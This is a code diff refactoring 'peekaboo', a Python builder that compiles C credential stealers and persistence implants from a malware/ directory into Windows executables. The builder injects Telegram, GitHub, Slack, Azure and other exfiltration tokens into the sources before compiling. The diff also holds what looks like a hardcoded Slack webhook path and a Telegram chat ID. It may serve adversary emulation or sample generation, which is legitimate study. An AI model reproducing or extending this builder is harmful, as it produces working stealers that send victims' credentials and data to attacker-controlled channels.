@@ -1,25 +1,49 @@
 """
-peekaboo standalone module compiler
-reads meow sources (read-only), copies to temp, compiles, outputs to samples/
+peekaboo standalone module compiler.
+
+One typed builder + one shared subprocess path. The three legacy
+compile_module / compile_stealer / compile_persistence entry points are kept
+as thin wrappers so existing callers (app.py, apt_pipeline.py) keep working
+unchanged.
+
+Design:
+  - BuildSpec : everything needed to produce one binary (read-only inputs).
+  - BuildResult : everything observable about the result (write-only output).
+  - build() : the single source of truth for compilation.
+  - _apply_credential_subs / _extra_libs : kept module-private; the spec
+    decides whether to invoke them.
+
+Source files are always copied to a tempdir; the meow/ tree is read-only.
 """
 from __future__ import annotations
+
 import json
 import re
 import shutil
 import subprocess
 import tempfile
+import time
+from dataclasses import dataclass, field
 from pathlib import Path
 from typing import Optional
 
 _BASE    = Path(__file__).parent.parent
 _CFG_DIR = _BASE / "config"
 _SAMPLES = _BASE / "samples"
+_MALWARE_DIR = _BASE / "malware"
 
-MINGW_FLAGS = [
+
+# -----------------------------------------------------------------------------
+# Configurable flags (loaded once at import time from config/builder_config.json
+# so a user can tune optimisation / strip / static linking without editing code)
+# -----------------------------------------------------------------------------
+
+_DEFAULT_MINGW_FLAGS = [
     "-ffunction-sections", "-fdata-sections", "-Wno-write-strings",
     "-fno-exceptions", "-fmerge-all-constants",
     "-static-libstdc++", "-static-libgcc", "-fpermissive", "-s", "-O2",
 ]
+_DEFAULT_GCC_FLAGS = ["-O2", "-s"]
 
 
 def _load_cfg(name: str) -> dict:
@@ -32,110 +56,244 @@ def _load_cfg(name: str) -> dict:
     return {}
 
 
-def _apply_credential_subs(src: str) -> str:
-    subs: dict[str, str] = {}
-
-    if re.search(r'telegram\.org|sendToTg|TELEGRAM', src, re.I):
-        cfg = _load_cfg("telegram_config")
-        if cfg.get("chat_id"):
-            subs["TELEGRAM_CHAT_ID_PLACEHOLDER"] = cfg["chat_id"]
-            subs["466662506"] = cfg["chat_id"]
-        if cfg.get("bot_token") and "xxx" not in cfg.get("bot_token", ""):
-            subs["TELEGRAM_BOT_TOKEN_PLACEHOLDER"] = cfg["bot_token"]
-
-    if re.search(r'api\.github\.com|sendToGit|GITHUB', src, re.I):
-        cfg = _load_cfg("github_config")
-        if cfg.get("github_token"):
-            subs["github_classic_token"] = cfg["github_token"]
-            subs["GITHUB_TOKEN"] = cfg["github_token"]
-        if cfg.get("repo_owner"):
-            subs["GITHUB_REPO_OWNER_PLACEHOLDER"] = cfg["repo_owner"]
-            subs["cocomelonc"] = cfg["repo_owner"]
-        if cfg.get("repo_name"):
-            subs["GITHUB_REPO_NAME_PLACEHOLDER"] = cfg["repo_name"]
-            subs["ejpt"] = cfg["repo_name"]
-        if cfg.get("issue_number"):
-            subs["GITHUB_ISSUE_NUMBER_PLACEHOLDER"] = cfg["issue_number"]
-
-    if re.search(r'bitbucket\.org|BITBUCKET', src, re.I):
-        cfg = _load_cfg("bitbucket_config")
-        if cfg.get("bitbucket_token_base64"):
-            subs["BITBUCKET_TOKEN_PLACEHOLDER"] = cfg["bitbucket_token_base64"]
-
-    if re.search(r'virustotal\.com|VT_API', src, re.I):
-        cfg = _load_cfg("virustotal_config")
-        if cfg.get("vt_api_key"):
-            subs["VT_API_KEY_PLACEHOLDER"] = cfg["vt_api_key"]
-
-    if re.search(r'dev\.azure\.com|AZURE', src, re.I):
-        cfg = _load_cfg("azure_config")
-        if cfg.get("azure_org"):
-            subs["AZURE_ORG_PLACEHOLDER"] = cfg["azure_org"]
-        if cfg.get("azure_project"):
-            subs["AZURE_PROJECT_PLACEHOLDER"] = cfg["azure_project"]
-        if cfg.get("azure_pat"):
-            subs["AZURE_PAT_PLACEHOLDER"] = cfg["azure_pat"]
-
-    if re.search(r'angelcam|ANGELCAM', src, re.I):
-        cfg = _load_cfg("angelcam_config")
-        if cfg.get("api_key"):
-            subs["ANGELCAM_API_KEY_PLACEHOLDER"] = cfg["api_key"]
-
-    if re.search(r'hooks\.slack|sendToSlack|SLACK', src, re.I):
-        cfg = _load_cfg("slack_config")
-        url = cfg.get("webhook_url", "")
-        if url and "YOUR/WEBHOOK" not in url:
-            # replace the hardcoded test path inside the WinHttpOpenRequest call
-            subs["/services/T05LNF51FAM/B09M7L8BQ91/GQtnKW33OKeQzTZbkZvustAu"] = \
-                "/" + url.split("hooks.slack.com/", 1)[-1] if "hooks.slack.com/" in url else url
-            subs["SLACK_WEBHOOK_URL_PLACEHOLDER"] = url
-
-    for k, v in subs.items():
-        if k and v:
-            src = src.replace(k, v)
-    return src
+_BUILDER_CFG     = _load_cfg("builder_config")
+MINGW_FLAGS      = _BUILDER_CFG.get("mingw_flags",      _DEFAULT_MINGW_FLAGS)
+GCC_FLAGS        = _BUILDER_CFG.get("gcc_flags",        _DEFAULT_GCC_FLAGS)
+DEFAULT_TIMEOUT  = int(_BUILDER_CFG.get("timeout_sec",  60))
 
 
-_MALWARE_DIR = _BASE / "malware"
+# -----------------------------------------------------------------------------
+# Compiler discovery
+# -----------------------------------------------------------------------------
+
+_COMPILER_BINS: dict[str, list[str]] = {
+    "mingw-gcc": ["x86_64-w64-mingw32-gcc", "/usr/bin/x86_64-w64-mingw32-gcc"],
+    "mingw-gpp": ["x86_64-w64-mingw32-g++", "/usr/bin/x86_64-w64-mingw32-g++"],
+    "gcc":       ["gcc", "/usr/bin/gcc"],
+    "gpp":       ["g++", "/usr/bin/g++"],
+}
 
 
-def _extra_libs(src: str) -> list[str]:
-    libs: list[str] = []
-    if re.search(r'WinHttp|winhttp', src):
-        libs.append("-lwinhttp")
-    if re.search(r'GetAdaptersInfo|GetIpAddrTable|iphlpapi', src, re.I):
-        libs.append("-liphlpapi")
-    if re.search(r'CryptProtect|CryptUnprotect|crypt32', src, re.I):
-        libs.append("-lcrypt32")
-    if re.search(r'WSAStartup|WSACleanup|ws2_32', src, re.I):
-        libs.append("-lws2_32")
-    if re.search(r'SHGetFolderPath|SHGetSpecialFolder|shlobj', src, re.I):
-        libs.append("-lshell32")
-    return libs
-
-
-def _find_compiler(compiler_type: str) -> Optional[str]:
-    candidates: dict[str, list[str]] = {
-        "mingw-gcc": ["x86_64-w64-mingw32-gcc", "/usr/bin/x86_64-w64-mingw32-gcc"],
-        "mingw-gpp": ["x86_64-w64-mingw32-g++", "/usr/bin/x86_64-w64-mingw32-g++"],
-        "gcc":       ["gcc", "/usr/bin/gcc"],
-        "gpp":       ["g++", "/usr/bin/g++"],
-    }
-    for c in candidates.get(compiler_type, []):
+def _find_compiler(kind: str) -> Optional[str]:
+    for c in _COMPILER_BINS.get(kind, []):
         if shutil.which(c) or Path(c).exists():
             return c
     return None
 
 
-def compile_module(
-    module_id: str,
-    session_id: str,
-) -> tuple[bool, str, Optional[Path]]:
-    """
-    Compile a single meow module standalone.
-    Returns (success, log, output_path).
-    Source files are copied to a temp dir - meow repo is never modified.
-    """
+# -----------------------------------------------------------------------------
+# Credential substitution (runs against the tempdir copy, never against meow/)
+# -----------------------------------------------------------------------------
+
+_CRED_RULES: list[tuple[str, str, list[tuple[str, str]]]] = [
+    # (source_regex, config_name, [(placeholder, config_key), ...])
+    (r"telegram\.org|sendToTg|TELEGRAM", "telegram_config", [
+        ("TELEGRAM_CHAT_ID_PLACEHOLDER",   "chat_id"),
+        ("466662506",                      "chat_id"),
+        ("TELEGRAM_BOT_TOKEN_PLACEHOLDER", "bot_token"),
+    ]),
+    (r"api\.github\.com|sendToGit|GITHUB", "github_config", [
+        ("github_classic_token",           "github_token"),
+        ("GITHUB_TOKEN",                   "github_token"),
+        ("GITHUB_REPO_OWNER_PLACEHOLDER",  "repo_owner"),
+        ("cocomelonc",                     "repo_owner"),
+        ("GITHUB_REPO_NAME_PLACEHOLDER",   "repo_name"),
+        ("ejpt",                           "repo_name"),
+        ("GITHUB_ISSUE_NUMBER_PLACEHOLDER","issue_number"),
+    ]),
+    (r"bitbucket\.org|BITBUCKET", "bitbucket_config", [
+        ("BITBUCKET_TOKEN_PLACEHOLDER",    "bitbucket_token_base64"),
+    ]),
+    (r"virustotal\.com|VT_API", "virustotal_config", [
+        ("VT_API_KEY_PLACEHOLDER",         "vt_api_key"),
+    ]),
+    (r"dev\.azure\.com|AZURE", "azure_config", [
+        ("AZURE_ORG_PLACEHOLDER",          "azure_org"),
+        ("AZURE_PROJECT_PLACEHOLDER",      "azure_project"),
+        ("AZURE_PAT_PLACEHOLDER",          "azure_pat"),
+    ]),
+    (r"angelcam|ANGELCAM", "angelcam_config", [
+        ("ANGELCAM_API_KEY_PLACEHOLDER",   "api_key"),
+    ]),
+]
+
+
+def _apply_credential_subs(src: str) -> str:
+    subs: dict[str, str] = {}
+    for pattern, cfg_name, mapping in _CRED_RULES:
+        if not re.search(pattern, src, re.I):
+            continue
+        cfg = _load_cfg(cfg_name)
+        for placeholder, key in mapping:
+            val = cfg.get(key, "")
+            if val and "xxx" not in str(val):
+                subs[placeholder] = str(val)
+
+    # Slack is special-cased because the placeholder is a real URL path
+    if re.search(r"hooks\.slack|sendToSlack|SLACK", src, re.I):
+        cfg = _load_cfg("slack_config")
+        url = cfg.get("webhook_url", "")
+        if url and "YOUR/WEBHOOK" not in url:
+            tail = url.split("hooks.slack.com/", 1)[-1] if "hooks.slack.com/" in url else url
+            subs["/services/T05LNF51FAM/B09M7L8BQ91/GQtnKW33OKeQzTZbkZvustAu"] = "/" + tail
+            subs["SLACK_WEBHOOK_URL_PLACEHOLDER"] = url
+
+    for placeholder, val in subs.items():
+        if placeholder and val:
+            src = src.replace(placeholder, val)
+    return src
+
+
+# -----------------------------------------------------------------------------
+# Extra-libs auto-detection. Each rule: (regex, link flag).
+# Order matters only for stability; matches are unioned.
+# -----------------------------------------------------------------------------
+
+_LIB_RULES: list[tuple[re.Pattern, str]] = [
+    (re.compile(r"WinHttp|winhttp"),                                  "-lwinhttp"),
+    (re.compile(r"GetAdaptersInfo|GetIpAddrTable|iphlpapi", re.I),    "-liphlpapi"),
+    (re.compile(r"CryptProtect|CryptUnprotect|crypt32",    re.I),    "-lcrypt32"),
+    (re.compile(r"WSAStartup|WSACleanup|ws2_32",           re.I),    "-lws2_32"),
+    (re.compile(r"SHGetFolderPath|SHGetSpecialFolder|shlobj", re.I), "-lshell32"),
+]
+
+
+def _extra_libs(src: str) -> list[str]:
+    found: list[str] = []
+    for rx, flag in _LIB_RULES:
+        if rx.search(src) and flag not in found:
+            found.append(flag)
+    return found
+
+
+# -----------------------------------------------------------------------------
+# Typed build interface
+# -----------------------------------------------------------------------------
+
+@dataclass
+class BuildSpec:
+    """Everything needed to produce one binary. All paths are read-only inputs."""
+    name:           str
+    src_path:       Path
+    out_path:       Path
+    compiler:       str            = "mingw-gcc"
+    extra_sources:  list[Path]     = field(default_factory=list)
+    extra_libs:     list[str]      = field(default_factory=list)
+    apply_creds:    bool           = True
+    timeout:        int            = DEFAULT_TIMEOUT
+    auto_detect_libs: bool         = True
+
+    def __post_init__(self):
+        self.src_path = Path(self.src_path)
+        self.out_path = Path(self.out_path)
+        self.extra_sources = [Path(p) for p in self.extra_sources]
+
+
+@dataclass
+class BuildResult:
+    """Observable outcome of a build. `log` is human-readable; `out_path` is None on failure."""
+    ok:          bool
+    log:         str
+    out_path:    Optional[Path]
+    returncode:  Optional[int]
+    duration_ms: int
+
+
+def _compile_cmd(compiler_path: str, kind: str, src: Path, out: Path,
+                 extra_libs: list[str]) -> list[str]:
+    flags = MINGW_FLAGS if kind.startswith("mingw") else GCC_FLAGS
+    return [compiler_path, *flags, str(src), "-o", str(out), *extra_libs]
+
+
+def build(spec: BuildSpec) -> BuildResult:
+    """Single source of truth for module/stealer/persistence compilation."""
+    started = time.monotonic()
+    log: list[str] = []
+
+    def _done(ok: bool, out: Optional[Path], rc: Optional[int]) -> BuildResult:
+        return BuildResult(
+            ok=ok,
+            log="\n".join(log),
+            out_path=out if (ok and out and out.exists()) else None,
+            returncode=rc,
+            duration_ms=int((time.monotonic() - started) * 1000),
+        )
+
+    if not spec.src_path.exists():
+        log.append(f"[fail] source missing: {spec.src_path}")
+        return _done(False, None, None)
+
+    compiler_path = _find_compiler(spec.compiler)
+    if not compiler_path:
+        log.append(f"[fail] compiler not installed: {spec.compiler}")
+        return _done(False, None, None)
+
+    spec.out_path.parent.mkdir(parents=True, exist_ok=True)
+
+    with tempfile.TemporaryDirectory() as tmpdir:
+        tmp = Path(tmpdir)
+
+        # Copy primary + any siblings the discovery layer flagged. meow stays untouched.
+        sources_to_copy = [spec.src_path, *spec.extra_sources]
+        for s in sources_to_copy:
+            try:
+                shutil.copy2(s, tmp / s.name)
+            except Exception as e:
+                log.append(f"[warn] copy {s.name}: {e}")
+
+        primary_tmp = tmp / spec.src_path.name
+
+        # Credential substitution + library auto-detection both want the source body.
+        try:
+            text = primary_tmp.read_text(encoding="utf-8", errors="replace")
+        except Exception as e:
+            log.append(f"[fail] read source copy: {e}")
+            return _done(False, None, None)
+
+        if spec.apply_creds:
+            try:
+                text = _apply_credential_subs(text)
+                primary_tmp.write_text(text, encoding="utf-8")
+            except Exception as e:
+                log.append(f"[warn] cred sub: {e}")
+
+        libs = list(spec.extra_libs)
+        if spec.auto_detect_libs:
+            for flag in _extra_libs(text):
+                if flag not in libs:
+                    libs.append(flag)
+
+        cmd = _compile_cmd(compiler_path, spec.compiler, primary_tmp, spec.out_path, libs)
+        log.append(f"[compile] {' '.join(cmd)}")
+
+        try:
+            r = subprocess.run(cmd, capture_output=True, text=True, timeout=spec.timeout)
+        except subprocess.TimeoutExpired:
+            log.append(f"[fail] timed out after {spec.timeout}s")
+            return _done(False, None, None)
+        except Exception as e:
+            log.append(f"[fail] {e}")
+            return _done(False, None, None)
+
+        if r.stdout:
+            log.append(r.stdout.rstrip())
+        if r.stderr:
+            log.append(r.stderr.rstrip())
+
+        if r.returncode == 0 and spec.out_path.exists():
+            log.append(f"[ok] {spec.out_path.name} ({spec.out_path.stat().st_size:,} bytes)")
+            return _done(True, spec.out_path, r.returncode)
+
+        log.append(f"[fail] rc={r.returncode}")
+        return _done(False, None, r.returncode)
+
+
+# -----------------------------------------------------------------------------
+# Backward-compatible wrappers (existing callers keep working)
+# -----------------------------------------------------------------------------
+
+def compile_module(module_id: str, session_id: str) -> tuple[bool, str, Optional[Path]]:
+    """Compile a meow-registry module by id into samples/<session_id>/."""
     import sys
     sys.path.insert(0, str(Path(__file__).parent))
     import discovery
@@ -146,157 +304,43 @@ def compile_module(
     if not mod.get("compilable", True):
         return False, f"not compilable (compiler: {mod['compiler']})", None
 
+    ext      = ".exe" if mod["platform"] == "windows" else ""
+    out_path = _SAMPLES / session_id / f"{mod['slug']}{ext}"
     src_path = Path(mod["src_path"])
-    if not src_path.exists():
-        return False, f"source missing: {src_path}", None
+    siblings = [Path(s["path"]) for s in mod.get("all_sources", [])
+                if Path(s["path"]) != src_path]
 
-    compiler = _find_compiler(mod["compiler"])
-    if not compiler:
-        return False, f"compiler not installed: {mod['compiler']}", None
-
-    out_dir = _SAMPLES / session_id
-    out_dir.mkdir(parents=True, exist_ok=True)
-
-    platform = mod["platform"]
-    ext      = ".exe" if platform == "windows" else ""
-    out_file = out_dir / f"{mod['slug']}{ext}"
-
-    log: list[str] = []
-
-    with tempfile.TemporaryDirectory() as tmpdir:
-        tmp = Path(tmpdir)
-
-        # copy all source files (read-only meow stays untouched)
-        for src_info in mod["all_sources"]:
-            s = Path(src_info["path"])
-            if s.exists():
-                shutil.copy2(s, tmp / s.name)
-
-        # apply credential substitutions to primary copy
-        primary_tmp = tmp / src_path.name
-        if primary_tmp.exists():
-            try:
-                text = primary_tmp.read_text(encoding="utf-8", errors="replace")
-                primary_tmp.write_text(_apply_credential_subs(text), encoding="utf-8")
-            except Exception as e:
-                log.append(f"[warn] cred sub: {e}")
-
-        extra_libs = mod.get("extra_libs", [])
-
-        if mod["compiler"] in ("mingw-gcc", "mingw-gpp"):
-            cmd = [compiler, *MINGW_FLAGS, str(primary_tmp), "-o", str(out_file)] + extra_libs
-        else:
-            cmd = [compiler, "-O2", "-s", str(primary_tmp), "-o", str(out_file)] + extra_libs
-
-        log.append(f"[compile] {' '.join(cmd)}")
-
-        try:
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
-            if result.stdout:
-                log.append(result.stdout)
-            if result.stderr:
-                log.append(result.stderr)
-            if result.returncode == 0 and out_file.exists():
-                size = out_file.stat().st_size
-                log.append(f"[ok] {out_file.name} ({size:,} bytes)")
-                return True, "\n".join(log), out_file
-            log.append(f"[fail] rc={result.returncode}")
-            return False, "\n".join(log), None
-        except subprocess.TimeoutExpired:
-            return False, "compilation timed out (60s)", None
-        except Exception as e:
-            return False, str(e), None
+    r = build(BuildSpec(
+        name=module_id,
+        src_path=src_path,
+        out_path=out_path,
+        compiler=mod["compiler"],
+        extra_sources=siblings,
+        extra_libs=mod.get("extra_libs", []),
+    ))
+    return r.ok, r.log, r.out_path
 
 
-def compile_stealer(
-    stealer_name: str,
-    session_id: str,
-) -> tuple[bool, str, Optional[Path]]:
-    """Compile a stealer from malware/stealer/.  Returns (ok, log, out_path)."""
-    src_path = _MALWARE_DIR / "stealer" / f"{stealer_name}.c"
-    if not src_path.exists():
-        return False, f"stealer source not found: {src_path.name}", None
+def compile_stealer(stealer_name: str, session_id: str) -> tuple[bool, str, Optional[Path]]:
+    """Compile a stealer from malware/stealer/<name>.c into samples/<session_id>/peekaboo.exe."""
+    src = _MALWARE_DIR / "stealer" / f"{stealer_name}.c"
+    if not src.exists():
+        return False, f"stealer source not found: {src.name}", None
 
-    compiler = _find_compiler("mingw-gcc")
-    if not compiler:
-        return False, "mingw-gcc not installed", None
-
-    out_dir = _SAMPLES / session_id
-    out_dir.mkdir(parents=True, exist_ok=True)
-    out_file = out_dir / "peekaboo.exe"
-
-    log: list[str] = []
-    with tempfile.TemporaryDirectory() as tmpdir:
-        tmp     = Path(tmpdir)
-        tmp_src = tmp / src_path.name
-        shutil.copy2(src_path, tmp_src)
-
-        try:
-            text = tmp_src.read_text(encoding="utf-8", errors="replace")
-            tmp_src.write_text(_apply_credential_subs(text), encoding="utf-8")
-        except Exception as e:
-            log.append(f"[warn] cred sub: {e}")
-            text = tmp_src.read_text(encoding="utf-8", errors="replace")
-
-        extra_libs = _extra_libs(text)
-        cmd = [compiler, *MINGW_FLAGS, str(tmp_src), "-o", str(out_file)] + extra_libs
-        log.append(f"[compile] {' '.join(cmd)}")
-
-        try:
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
-            if result.stdout:
-                log.append(result.stdout)
-            if result.stderr:
-                log.append(result.stderr)
-            if result.returncode == 0 and out_file.exists():
-                log.append(f"[ok] {out_file.name} ({out_file.stat().st_size:,} bytes)")
-                return True, "\n".join(log), out_file
-            log.append(f"[fail] rc={result.returncode}")
-            return False, "\n".join(log), None
-        except subprocess.TimeoutExpired:
-            return False, "compilation timed out (60s)", None
-        except Exception as e:
-            return False, str(e), None
+    out = _SAMPLES / session_id / "peekaboo.exe"
+    r = build(BuildSpec(name=stealer_name, src_path=src, out_path=out))
+    return r.ok, r.log, r.out_path
 
 
-def compile_persistence(
-    persistence_name: str,
-    out_dir: Path,
-) -> tuple[bool, str, Optional[Path]]:
-    """Compile a persistence mechanism from malware/persistence/.  Returns (ok, log, out_path)."""
-    src_path = _MALWARE_DIR / "persistence" / f"{persistence_name}.c"
-    if not src_path.exists():
-        return False, f"persistence source not found: {src_path.name}", None
+def compile_persistence(persistence_name: str, out_dir: Path) -> tuple[bool, str, Optional[Path]]:
+    """Compile malware/persistence/<name>.c into <out_dir>/persistence.exe."""
+    src = _MALWARE_DIR / "persistence" / f"{persistence_name}.c"
+    if not src.exists():
+        return False, f"persistence source not found: {src.name}", None
 
-    compiler = _find_compiler("mingw-gcc")
-    if not compiler:
-        return False, "mingw-gcc not installed", None
-
-    out_file = out_dir / "persistence.exe"
-    log: list[str] = []
-
-    with tempfile.TemporaryDirectory() as tmpdir:
-        tmp     = Path(tmpdir)
-        tmp_src = tmp / src_path.name
-        shutil.copy2(src_path, tmp_src)
-
-        text       = src_path.read_text(encoding="utf-8", errors="replace")
-        extra_libs = _extra_libs(text)
-        cmd = [compiler, *MINGW_FLAGS, str(tmp_src), "-o", str(out_file)] + extra_libs
-        log.append(f"[compile] {' '.join(cmd)}")
-
-        try:
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
-            if result.stdout:
-                log.append(result.stdout)
-            if result.stderr:
-                log.append(result.stderr)
-            if result.returncode == 0 and out_file.exists():
-                log.append(f"[ok] {out_file.name} ({out_file.stat().st_size:,} bytes)")
-                return True, "\n".join(log), out_file
-            log.append(f"[fail] rc={result.returncode}")
-            return False, "\n".join(log), None
-        except subprocess.TimeoutExpired:
-            return False, "compilation timed out (60s)", None
-        except Exception as e:
-            return False, str(e), None
+    out = Path(out_dir) / "persistence.exe"
+    # credential subs aren't needed here (persistence files have no secrets)
+    r = build(BuildSpec(
+        name=persistence_name, src_path=src, out_path=out, apply_creds=False,
+    ))
+    return r.ok, r.log, r.out_path
